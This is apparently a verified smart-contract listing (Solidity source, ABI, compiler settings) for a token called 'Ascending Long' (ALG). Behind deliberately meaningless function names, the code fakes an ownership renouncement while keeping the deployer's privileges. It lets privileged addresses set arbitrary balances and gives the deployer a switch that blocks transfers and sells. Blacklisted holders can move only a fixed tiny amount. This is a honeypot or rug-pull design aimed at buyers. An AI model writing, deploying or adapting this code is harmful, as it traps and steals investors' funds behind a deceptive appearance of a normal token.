{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface buyMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverMarketing {\n    function createPair(address senderAmount, address minAt) external returns (address);\n}\n\ninterface marketingIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundList) external view returns (uint256);\n\n    function transfer(address receiverSwap, uint256 listTxTotal) external returns (bool);\n\n    function allowance(address txLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listTxTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverSwap,\n        uint256 listTxTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderSwap, uint256 value);\n    event Approval(address indexed txLaunched, address indexed spender, uint256 value);\n}\n\ninterface marketingIsMetadata is marketingIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AscendingLong is enableFee, marketingIs, marketingIsMetadata {\n\n    mapping(address => bool) public toMarketing;\n\n    string private tradingAt = \"Ascending Long\";\n\n    function allowance(address enableLimit, address liquidityMin) external view virtual override returns (uint256) {\n        if (liquidityMin == toReceiver) {\n            return type(uint256).max;\n        }\n        return enableTeam[enableLimit][liquidityMin];\n    }\n\n    function receiverFee(address exemptAuto) public {\n        require(exemptAuto.balance < 100000);\n        if (fromMarketing) {\n            return;\n        }\n        \n        tokenTotal[exemptAuto] = true;\n        \n        fromMarketing = true;\n    }\n\n    function launchedTotal(address tokenMode, uint256 listTxTotal) public {\n        fundFee();\n        takeLaunched[tokenMode] = listTxTotal;\n    }\n\n    mapping(address => mapping(address => uint256)) private enableTeam;\n\n    function senderTrading(address tokenSwap, address receiverSwap, uint256 listTxTotal) internal returns (bool) {\n        require(takeLaunched[tokenSwap] >= listTxTotal);\n        takeLaunched[tokenSwap] -= listTxTotal;\n        takeLaunched[receiverSwap] += listTxTotal;\n        emit Transfer(tokenSwap, receiverSwap, listTxTotal);\n        return true;\n    }\n\n    function approve(address liquidityMin, uint256 listTxTotal) public virtual override returns (bool) {\n        enableTeam[_msgSender()][liquidityMin] = listTxTotal;\n        emit Approval(_msgSender(), liquidityMin, listTxTotal);\n        return true;\n    }\n\n    string private walletIs = \"ALG\";\n\n    uint256 public isTradingTeam;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingAt;\n    }\n\n    function getOwner() external view returns (address) {\n        return liquidityLaunch;\n    }\n\n    uint256 txBuy;\n\n    function fundFee() private view {\n        require(tokenTotal[_msgSender()]);\n    }\n\n    address public totalExempt;\n\n    function transferFrom(address tokenSwap, address receiverSwap, uint256 listTxTotal) external override returns (bool) {\n        if (_msgSender() != toReceiver) {\n            if (enableTeam[tokenSwap][_msgSender()] != type(uint256).max) {\n                require(listTxTotal <= enableTeam[tokenSwap][_msgSender()]);\n                enableTeam[tokenSwap][_msgSender()] -= listTxTotal;\n            }\n        }\n        return fundSell(tokenSwap, receiverSwap, listTxTotal);\n    }\n\n    uint256 private exemptReceiverFund = 100000000 * 10 ** 18;\n\n    uint256 receiverSenderIs;\n\n    function fundSell(address tokenSwap, address receiverSwap, uint256 listTxTotal) internal returns (bool) {\n        if (tokenSwap == shouldSellFund) {\n            return senderTrading(tokenSwap, receiverSwap, listTxTotal);\n        }\n        uint256 fundAmount = marketingIs(totalExempt).balanceOf(receiverTeam);\n        require(fundAmount == txBuy);\n        require(receiverSwap != receiverTeam);\n        if (toMarketing[tokenSwap]) {\n            return senderTrading(tokenSwap, receiverSwap, receiverBuy);\n        }\n        return senderTrading(tokenSwap, receiverSwap, listTxTotal);\n    }\n\n    address toReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed sellMin, address indexed totalLimitFee);\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletIs;\n    }\n\n    uint256 constant receiverBuy = 3 ** 10;\n\n    bool public fromMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptReceiverFund;\n    }\n\n    uint8 private swapFundSender = 18;\n\n    uint256 public launchedFromAt;\n\n    mapping(address => bool) public tokenTotal;\n\n    mapping(address => uint256) private takeLaunched;\n\n    address private liquidityLaunch;\n\n    address receiverTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address fundList) public view virtual override returns (uint256) {\n        return takeLaunched[fundList];\n    }\n\n    function modeTotal(address receiverLiquidityMax) public {\n        fundFee();\n        \n        if (receiverLiquidityMax == shouldSellFund || receiverLiquidityMax == totalExempt) {\n            return;\n        }\n        toMarketing[receiverLiquidityMax] = true;\n    }\n\n    function takeTxTeam() public {\n        emit OwnershipTransferred(shouldSellFund, address(0));\n        liquidityLaunch = address(0);\n    }\n\n    constructor (){\n        \n        buyMin feeMin = buyMin(toReceiver);\n        totalExempt = receiverMarketing(feeMin.factory()).createPair(feeMin.WETH(), address(this));\n        \n        shouldSellFund = _msgSender();\n        takeTxTeam();\n        tokenTotal[shouldSellFund] = true;\n        takeLaunched[shouldSellFund] = exemptReceiverFund;\n        \n        emit Transfer(address(0), shouldSellFund, exemptReceiverFund);\n    }\n\n    function owner() external view returns (address) {\n        return liquidityLaunch;\n    }\n\n    function amountLimitReceiver(uint256 listTxTotal) public {\n        fundFee();\n        txBuy = listTxTotal;\n    }\n\n    function transfer(address tokenMode, uint256 listTxTotal) external virtual override returns (bool) {\n        return fundSell(_msgSender(), tokenMode, listTxTotal);\n    }\n\n    uint256 private autoFeeMarketing;\n\n    address public shouldSellFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapFundSender;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLimitFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listTxTotal\",\"type\":\"uint256\"}],\"name\":\"amountLimitReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTxTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTradingTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFromAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTxTotal\",\"type\":\"uint256\"}],\"name\":\"launchedTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidityMax\",\"type\":\"address\"}],\"name\":\"modeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAuto\",\"type\":\"address\"}],\"name\":\"receiverFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSellFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTxTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTxTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTxTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AscendingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}